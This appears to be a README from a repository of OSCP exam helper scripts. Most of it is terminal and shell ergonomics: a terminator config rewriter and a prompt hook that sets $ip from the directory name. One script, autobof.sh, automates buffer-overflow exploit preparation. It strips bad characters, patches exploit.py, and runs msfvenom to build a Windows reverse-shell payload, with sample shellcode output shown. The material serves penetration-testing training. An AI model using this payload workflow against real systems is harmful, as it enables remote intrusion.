# OSCP
## OSCP Ergonomic Scripts and Configs

__config.bak__ - A terminator config file that will be used to launch terminator and execute commands like ($ autorecon $ip) 
             across different IP folders using broadcast all mode.

__autoterm.sh__ - A script that will replace the placeholder ProjectX and #1,2,3,4,5 with the ProjectName and the target IP's.

```bash
# Example - terminators config file is reset using config.bak and reconfigured with the new projects IPs
# $./autoterm.sh
# Insert your Kali IP (Default: 127.0.0.1): 192.168.0.104
# Insert your Kali Port (Default: 22): 2222
# Setting Kali IP to 192.168.0.104
# Setting Kali SSH Port to 2222
# Project Name: R
# IPs: 10.10.10.23 10.10.10.5
# Terminator config successfully changed.

#!/bin/bash
# Restore original config
cp ~/.config/terminator/config.bak ~/.config/terminator/config
count=0 #Counter for Number of IPs

# This host should be accessible using preset ssh-keys. SSH Password setup will break terminator.
read -a kalibox -p 'Insert your Kali IP (Default: 127.0.0.1): '
# The ssh service on this host should be running on port 22 by default
read -a kaliport -p 'Insert your Kali Port (Default: 22): ' 

if [ -z "$kalibox" ]
then 
  kalibox="127.0.0.1";
fi 

echo "Setting Kali IP to ${kalibox}"

if [ -z "$kaliport" ]
then 
  kaliport="22";
fi

echo "Setting Kali SSH Port to ${kaliport}"

read -a project -p 'Project Name: '
read -a ips -p 'IPs: '

if [ -z "$project" ]
then 
  echo "Project Name cannot be empty"
  exit 0
fi

if [ -z "$ips" ]
then 
  echo "Please specify some IPs"
  exit 0
fi 

for elem in ${ips[@]}
do
  if [[ ! "$elem" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then 
    echo "Please specify real IPs"
    exit 0
  fi 
  count=$((count+1))
  sed -i "s/127.0.0.1/$kalibox/g" ~/.config/terminator/config
  sed -i "s/2222/$kaliport/g" ~/.config/terminator/config
  sed -i "s/projectX/$project/g" ~/.config/terminator/config 
  sed -i "s/#$count/$elem/g" ~/.config/terminator/config 
done

echo 'Terminator config successfully changed.'
```


__autobof.sh__ - A script of generating 'full hex shellcode characterset' -> 'hex shellcode with deducted badchars' -> 'msfpayload'. Autobof will automatically generate payloads and modify exploit.py payload variable. Note: You have to paste the final msfvenom into
exploit.py
__badcharset.py__ - A script for generating the full hex shellcode 
__exploit.py__ - A python script for testing for simple buffer overflow

```bash
# Author: Andrew Abwoga
# This script will automatically generate a characterset without the bad characters the user has specified
# Specify outlying bad characters (from mona): 01 02 03
# Specify lhost (for venom): 127.0.0.1
# [+] Bad character shellcode: \x01\x02\x03
# [+] Bad character deduction: 
# payload = "\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"
# [+] Modifying exploit.py payload with characterset without bad characters...
# [+] msfvenom output: [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# Found 11 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
# Attempting to encode payload with 1 iterations of generic/none
# generic/none failed with Encoding failed due to a bad character (index=40, char=0x01)
# Attempting to encode payload with 1 iterations of x86/call4_dword_xor
# x86/call4_dword_xor succeeded with size 348 (iteration=0)
# x86/call4_dword_xor chosen with final size 348
# Payload size: 348 bytes
# Final size of c file: 1488 bytes
# unsigned char buf[] = 
# "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"...

#!/bin/bash

echo "Note: Provide empty inputs to generate a full characterset payload."
read -a badchars -p 'Specify outlying bad characters (from mona): ' 
read -a lhost -p 'Specify lhost (for venom): '

if [ -z "$badchars" ]
then
echo "[+] Full bad characterset payload: "
echo "payload = \"$(python2 badcharset.py)\""

echo "[+] Modifying exploit.py payload with full characterset..."
cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
replacement=$(echo -E "payload = \"$(python2 badcharset.py)\"" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}' ) 
sed -i "/payload = \"\"/c $replacement" exploit.py
fi

if [ -n "$badchars" ]
then
echo -n "[+] Bad character shellcode: "
bc="$(echo ${badchars[@]} | sed 's/ /\\x/g' | sed 's/^/\\x/g' | tr '' '\n')"
echo "$bc"

echo "[+] Bad character deduction: "
pattern=$(for i in ${badchars[@]}; do echo -n "s+x$i\\\++g; " ; done)
badcharsreplacement=$(echo -E "payload = \"$(python2 badcharset.py)\"" | sed "$pattern" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}')
echo $badcharsreplacement

echo "[+] Modifying exploit.py payload with characterset without bad characters..."
cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
sed -i "/payload = \"\"/c $badcharsreplacement" exploit.py
fi

if [ -n "$lhost" ]
then
echo -n "[+] msfvenom output: "
cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
echo -E "$(msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread -b "$bc" -f c)"
fi
```
__dollar_ip_prompt_command.sh__ - Has a PROMPT_COMMAND env variable that will track a directory named using an IP on the current path (pwd)
                             and it will set the $ip env variable to that IP named directory. The code should be place on .bashrc or .zshrc. For zsh you have to add the line ```bash precmd() { eval "$PROMPT_COMMAND" }``` at the end of the .zshrc file

```bash
# Example - $ip env variable is automatically set using the code below
# $ mkdir 10.10.10.5
# $ cd 10.10.10.5
# $ autorecon $ip 

function prompt_command {
	unset ip #unset IP to make sure its not assigned
	nfields=$(echo $PWD | awk -F '/' '{print NF}') #get the number of directories along the path
	for i in $(seq $nfields) #iterate through the number of directories in the path
	do
		base=$(echo $PWD | awk -v i=$i -F '/' '{print $i}') #get a specific directory
		if [[ $base =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then #if that directory is an ip
			export ip=$base #export that ip 
		fi
	done
}
export PROMPT_COMMAND=prompt_command
```

[![Watch the video](https://i1.ytimg.com/vi/vRj62ltRSiY/sddefault.jpg)](https://www.youtube.com/watch?v=vRj62ltRSiY "Click to watch demo on Youtube")

